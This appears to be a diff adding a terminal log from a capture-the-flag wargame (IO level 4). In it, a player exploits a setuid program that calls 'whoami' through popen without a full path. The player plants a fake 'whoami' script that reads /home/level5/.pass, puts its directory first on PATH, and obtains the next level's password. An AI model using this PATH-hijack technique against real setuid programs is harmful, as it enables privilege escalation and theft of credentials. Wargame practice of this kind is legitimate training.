@@ -1,0 +1,30 @@
+level4@io:/levels$ ls -l | grep level04
+-r-sr-x---  1 level5  level4   5159 Dec 18  2013 level04
+-r-sr-x---  1 level5  level4   5180 Sep 24  2014 level04_alt
+-r--------  1 level4  level4    120 Sep 24  2014 level04_alt.c
+-r--------  1 level4  level4    245 Dec 18  2013 level04.c
+level4@io:/levels$ cat level04.c
+//writen by bla
+#include <stdlib.h>
+#include <stdio.h>
+
+int main() {
+        char username[1024];
+        FILE* f = popen("whoami","r");
+        fgets(username, sizeof(username), f);
+        printf("Welcome %s", username);
+
+        return 0;
+}
+
+level4@io:/levels$ mkdir /tmp/abc
+level4@io:/levels$ cat > /tmp/abc/whoami
+#!/bin/sh
+cat /home/level5/.pass
+^C
+level4@io:/levels$ chmod +x /tmp/abc/whoami
+level4@io:/levels$ export PATH="/tmp/abc:$PATH"
+level4@io:/levels$ echo $PATH
+/tmp/abc:/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+level4@io:/levels$ ./level04
+Welcome DNLM3Vu0mZfX0pDd
